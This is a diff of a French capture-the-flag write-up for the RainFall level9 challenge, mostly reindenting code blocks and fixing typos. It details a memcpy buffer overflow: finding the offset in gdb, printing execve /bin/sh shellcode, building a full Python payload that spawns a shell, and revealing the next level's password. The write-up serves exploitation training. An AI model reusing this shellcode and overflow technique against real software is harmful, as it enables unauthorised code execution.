@@ -6,95 +6,97 @@ En testant le binaire on ne voit rien de particulier. Le programme quitte normal
 
 On remarque que cette fois le langage utilisé est du CPP puisque des bibliothèques c++ sont utilisés.
 
-```
-level9@RainFall:~$ ldd level9
-	linux-gate.so.1 =>  (0xb7fff000)
-	libstdc++.so.6 => /usr/lib/i386-linux-gnu/libstdc++.so.6 (0xb7f12000)
-	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d69000)
-	libm.so.6 => /lib/i386-linux-gnu/libm.so.6 (0xb7d3c000)
-	/lib/ld-linux.so.2 (0x80000000)
-	libgcc_s.so.1 => /lib/i386-linux-gnu/libgcc_s.so.1 (0xb7d1e000)
-```
+	```
+	level9@RainFall:~$ ldd level9
+		linux-gate.so.1 =>  (0xb7fff000)
+		libstdc++.so.6 => /usr/lib/i386-linux-gnu/libstdc++.so.6 (0xb7f12000)
+		libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d69000)
+		libm.so.6 => /lib/i386-linux-gnu/libm.so.6 (0xb7d3c000)
+		/lib/ld-linux.so.2 (0x80000000)
+		libgcc_s.so.1 => /lib/i386-linux-gnu/libgcc_s.so.1 (0xb7d1e000)
+	```
 
 Dans le code on peut voir l'utilisation de la fonction memcpy qui peut-être exploitable si l'input n'est pas vérifier.
 
-```
-   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
-   ```
+	```
+	0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+	```
 
 On va donc pouvoir faire un buffer overflow.
 
 On ne trouve pas /bin/sh donc il va falloir utiliser un shellcode:
 
-```
-\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
-```
+	\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
 
 On peut maintenant essayer de trouver un offset en utilisant un pattern generator:
 
-```
-(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+	```
+	(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+	Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
-Program received signal SIGSEGV, Segmentation fault.
-0x08048682 in main ()
-```
+	Program received signal SIGSEGV, Segmentation fault.
+	0x08048682 in main ()
+	```
 
 Ce qui nous donne un offset de 108.
 l'offset correspont a $eax qui correspond a argv[1] qui est l'argument de memcpy. C'est donc celui-ci que nous allons exploiter.
 
 On cherche l'adresse de notre argv[1]:
 
-```
-r AAAA
-Starting program: /home/user/level9/level9 AAAA
+	```
+	r AAAA
+	Starting program: /home/user/level9/level9 AAAA
 
-Breakpoint 1, 0x0804867c in main ()
-(gdb) x $eax
-0x804a00c:	0x41414141
-```
+	Breakpoint 1, 0x0804867c in main ()
+	(gdb) x $eax
+	0x804a00c:	0x41414141
+	```
 
 L'adresse de argv[1] est: 0x0804a00c
-On est check que le saut de mémoire fonctionne bien:
+On check que le saut de mémoire fonctionne bien:
 
-```
-r $(python -c 'print "A" * 108 + "\x08\x04\xa0\x0c"[::-1]')
-Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "\x08\x04\xa0\x0c"[::-1]')
+	```
+	r $(python -c 'print "A" * 108 + "\x08\x04\xa0\x0c"[::-1]')
+	Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "\x08\x04\xa0\x0c"[::-1]')
 
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-```
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41414141 in ?? ()
+	```
 
-Cette fois on a bien écraser eip, mais puisqu'on dereference 2 fois eax. 
-```
-  0x08048680 <+140>:	mov    (%eax),%eax
-   0x08048682 <+142>:	mov    (%eax),%edx
-   ```
+Cette fois on a bien écraser eip, mais puisqu'on dereference 2 fois eax.
+
+	```
+	0x08048680 <+140>:	mov    (%eax),%eax
+	0x08048682 <+142>:	mov    (%eax),%edx
+	```
 
 
-Pour éviter de tomber sur 0x41414141, on peut rajouter l'adresse de notre shellocode: 
+Pour éviter de tomber sur 0x41414141, on peut rajouter l'adresse de notre shellcode: 
 0804a00c + 4 = 0x0804a010 (car on veut arriver directe sur le shellcode).
 
 Notre payload ressemblera a ça:
-```
-payload = shell_addr + shellcode + padding + buffer_addr
-		   [4 bytes]   [21 bytes] [83 bytes] [4 bytes]
-```
+
+	```
+	payload = shell_addr + shellcode + padding + buffer_addr
+			[4 bytes]   [21 bytes] [83 bytes] [4 bytes]
+	```
 
 On le crée:
-```
-python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1]'
-```
+
+	```
+	python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1]'
+	```
 
 On exécute:
-```
-level9@RainFall:~$ ./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1]')
-$ ls
-ls: cannot open directory .: Permission denied
-$ cd ../bonus0
-$ cat .pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-```
+
+	```
+	level9@RainFall:~$ ./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1]')
+	$ ls
+	ls: cannot open directory .: Permission denied
+	$ cd ../bonus0
+	$ cat .pass
+	f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+	```
 
 Succès !!!
 
